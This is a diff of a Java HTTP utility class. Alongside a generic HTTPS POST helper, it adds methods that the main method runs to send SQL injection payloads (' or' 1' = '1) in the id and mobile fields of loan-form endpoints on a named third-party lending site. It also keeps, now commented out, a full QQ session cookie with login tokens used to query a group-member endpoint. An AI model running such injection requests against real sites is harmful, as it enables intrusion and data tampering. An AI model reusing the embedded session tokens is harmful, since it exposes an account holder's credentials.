@@ -47,21 +47,54 @@ public class HttpUtil {
 //		Long gtk = QQUtil.getGTK("@lxG2HhDgq");
 //		Long bkn = QQUtil.getBkn("n1NOV4H97md6kaQY97RHOhDW28ZTTdmewxWtFPFg2jE_");
 		
-		Map<String, String> paramsMap = new HashMap<String, String>();
-		paramsMap.put("gc", "245854112");
-		paramsMap.put("st", "1");
-		paramsMap.put("end", "1000");
-		paramsMap.put("sort", "0");
-		paramsMap.put("bkn", "415862199");
-		
-		Map<String, String> headerMap = new HashMap<String, String>();
-		headerMap.put("Cookie", "RK=lH2biZzOYi; _qpsvr_localtk=0.05784163728124181; pgv_pvi=9110548480; pgv_si=s9757825024; verifysession=h01187ce47ceb06786b22fa68bcb77bf97b7c7ddfeae3ed8f78b4a10bab92fb37fa947055db8a46f0ae; pac_uid=1_383041699; pgv_info=ssid=s6501896064; pgv_pvid=4775467852; o_cookie=383041699; ptisp=ctc; ptcz=1e54129e0f3c60d64337c87c642682aa6b00845096f38ae402edc2cdb2e37b62; pt2gguin=o0383041699; uin=o0383041699; skey=@nYvJqIHTU; p_uin=o0383041699; p_skey=*TFgRACxL2sLJbA1K6zmpgYrtIDAUQjuqJkRqawct-c_; pt4_token=M32fK1mWrScypyfVS18vH3mdOM1TW0gncLfyWmy29Cc_");
-		String responseResult = buildPostOfParam("http://qun.qq.com/cgi-bin/qun_mgr/search_group_members", paramsMap, headerMap);
-		System.out.println(responseResult);
+//		Map<String, String> paramsMap = new HashMap<String, String>();
+//		paramsMap.put("gc", "245854112");
+//		paramsMap.put("st", "1");
+//		paramsMap.put("end", "1000");
+//		paramsMap.put("sort", "0");
+//		paramsMap.put("bkn", "415862199");
+//		
+//		Map<String, String> headerMap = new HashMap<String, String>();
+//		headerMap.put("Cookie", "RK=lH2biZzOYi; _qpsvr_localtk=0.05784163728124181; pgv_pvi=9110548480; pgv_si=s9757825024; verifysession=h01187ce47ceb06786b22fa68bcb77bf97b7c7ddfeae3ed8f78b4a10bab92fb37fa947055db8a46f0ae; pac_uid=1_383041699; pgv_info=ssid=s6501896064; pgv_pvid=4775467852; o_cookie=383041699; ptisp=ctc; ptcz=1e54129e0f3c60d64337c87c642682aa6b00845096f38ae402edc2cdb2e37b62; pt2gguin=o0383041699; uin=o0383041699; skey=@nYvJqIHTU; p_uin=o0383041699; p_skey=*TFgRACxL2sLJbA1K6zmpgYrtIDAUQjuqJkRqawct-c_; pt4_token=M32fK1mWrScypyfVS18vH3mdOM1TW0gncLfyWmy29Cc_");
+//		String responseResult = buildPostOfParam("http://qun.qq.com/cgi-bin/qun_mgr/search_group_members", paramsMap, headerMap);
+//		System.out.println(responseResult);
 //		Map<String, String> paramsMap = new HashMap<String, String>();
 //		paramsMap.put("ticket", "aabb");
 //		String responseResult = buildPostOfParam("http://localhost/customer/third/zzw/validate", paramsMap);
 //		System.out.println(responseResult);
+		
+//		String addRst = addLoadHttp();
+		String updateRst = updateLoanHttp();
+	}
+
+
+	private static String updateLoanHttp() {
+		//' or' 1' = '1
+		Map<String, String> paramsMap = new HashMap<String, String>();
+		paramsMap.put("id", "1109641 ' or' 1' = '1");
+		paramsMap.put("money", "50000");
+		paramsMap.put("age", "33");
+		paramsMap.put("house", "有");
+		paramsMap.put("car", "有");
+		String responseRst = buildHttpsPost("https://jietiao.zhudai888.com/sem/pc_update_loan.html", paramsMap);
+		System.out.println(responseRst);
+		return responseRst;
+	}
+
+
+	private static String addLoadHttp() {
+		Map<String, String> paramsMap = new HashMap<String, String>();
+		paramsMap.put("name", "谢谢");
+		paramsMap.put("mobile", "MTU5NjU2NTg5ODk=' or' 1' = '1;");
+		paramsMap.put("sex", "1");
+		paramsMap.put("city", "阜阳");
+		paramsMap.put("source", "A7");
+		paramsMap.put("ismove", "0");
+		paramsMap.put("weburl", "https://jietiao.zhudai888.com/sem/index_pc.html?t=A7&jihua=%E5%93%81%E7%89%8C%E8%AF%8D-PC%E7%AB%AF&danyuan=%E5%93%81%E7%89%8C%2B%E5%8A%A9%E8%B4%B7%E7%BD%91&keyword=%E5%8A%A9%E8%B4%B7%E7%BD%91&e_keywordid=63624812929&e_matchtype=1&e_creative=16618082396&e_adposition=cl1&e_pagenum=1");
+		paramsMap.put("mid", ";");
+		String responseRes = buildHttpsPost("https://jietiao.zhudai888.com/sem/new_loan_do.html", paramsMap);
+		System.out.println(responseRes);
+		return responseRes;
 	}
 
 
@@ -132,7 +165,6 @@ public class HttpUtil {
 			for (Map.Entry<String, String>  entry: paramsMap.entrySet()) {
 				params.add(new BasicNameValuePair(entry.getKey(), entry.getValue()));
 			}
-//			buildEncode(httppost, params);
 			httppost.setEntity(new UrlEncodedFormEntity(params, HTTP.UTF_8));
             HttpResponse response = httpclient.execute(httppost); 
             HttpEntity responseEntity = response.getEntity();  
@@ -143,6 +175,36 @@ public class HttpUtil {
             e.printStackTrace();  
         }
         return responseJson;
+	}
+	
+	
+	
+	/**
+	 * 执行post请求
+	 * @param url
+	 * @param paramsMap
+	 * @return
+	 */
+	public static String buildHttpsPost(String url, Map<String, String> paramsMap){
+		String responseJson = "";
+		DefaultHttpClient httpclient = new DefaultHttpClient();
+		httpclient = (DefaultHttpClient) wrapClient(httpclient);
+		HttpPost httppost = new HttpPost(url);
+		List<NameValuePair> params = new ArrayList<NameValuePair>();
+		try {
+			for (Map.Entry<String, String>  entry: paramsMap.entrySet()) {
+				params.add(new BasicNameValuePair(entry.getKey(), entry.getValue()));
+			}
+			httppost.setEntity(new UrlEncodedFormEntity(params, HTTP.UTF_8));
+			HttpResponse response = httpclient.execute(httppost); 
+			HttpEntity responseEntity = response.getEntity();  
+			if (responseEntity != null) {
+				responseJson = EntityUtils.toString(responseEntity, "UTF-8");
+			}
+		} catch (Exception e) {  
+			e.printStackTrace();  
+		}
+		return responseJson;
 	}
 	
 	
